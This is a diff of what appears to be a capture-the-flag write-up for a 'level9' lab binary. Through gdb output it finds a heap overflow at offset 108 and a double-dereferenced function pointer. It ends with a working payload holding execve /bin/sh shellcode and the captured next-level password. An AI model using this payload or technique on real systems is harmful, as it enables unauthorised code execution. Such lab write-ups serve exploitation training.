@@ -1,9 +1,70 @@
-edx execute pointer of pointer
--> PTR_SHELLCODE = addr to SHELLCODE
--> SHELLCODE = shellcode
+# Call to memcpy we can try to overflow
+=> 0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
 
-r $(python -c "print 'A' * 108 + '$PTR_SHELLCODE")
+# Let's try finding at which offset the program segfault
+gdb> pattern create 200
+gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+SIGSEGV
+gdb> pattern search
+[...]
+EAX+0 found at offset: 108
+[...]
 
-0xf7c8e980 + "DUMM" + 0xffffdf57
+# We see that the program try to dereference `eax` 2 times and store the result in `edx`
+# Then it try calling `edx`
+gdb> disass main
+[...]
+=> 0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
+   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+[...]
+   0x08048693 <+159>:	call   edx
+[...]
 
-0xffffdfb4
+# Let's try to find where our buffer is stored
+gdb> b *0x8048677
+gdb> r $(python -c "print 'B'*108")
+gdb> x $esp
+0xbffff690:	0x0804a008
+gdb> ni
+gdb> x/100xg 0x0804a008
+0x804a008:	0x4242424208048848	0x4242424242424242
+0x804a018:	0x4242424242424242	0x4242424242424242
+0x804a028:	0x4242424242424242	0x4242424242424242
+0x804a038:	0x4242424242424242	0x4242424242424242
+0x804a048:	0x4242424242424242	0x4242424242424242
+0x804a058:	0x4242424242424242	0x4242424242424242
+0x804a068:	0x4242424242424242	0x4242424242424242
+0x804a078:	0x0000000008048848	0x0000000000000000
+[...]
+# We found it !
+
+# We know the program is trying to dereference the 4 bytes after the offset 2 times
+gdb> r $(python -c "print 'A'* 108 + BBBB'")
+# After call to 0x804870e <_ZN1N13setAnnotationEPc>
+gdb> x $eax
+0x97ecb74:	0x41414141
+
+gdb> ni
+=> 0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
+gdb> x $eax
+0x97ecbe0:	0x42424242
+
+gdb> ni
+=> 0x8048680 <main+140>:	mov    eax,DWORD PTR [eax]
+gdb> x $eax
+0x42424242:	Cannot access memory at address 0x42424242
+
+gdb> ni
+=> 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
+SIGSEGV # Because it can't dereference the address 0x42424242
+
+# So we will create a payload that look like this:
+# [Address] - [ShellCode] - [Padding] - [Address]
+#  4 bytes  -   23 bytes  -  81 bytes -  4 bytes = 112 bytes
+# The last address point to the first adress, which point to the nopsled
+
+$> ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
+> cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
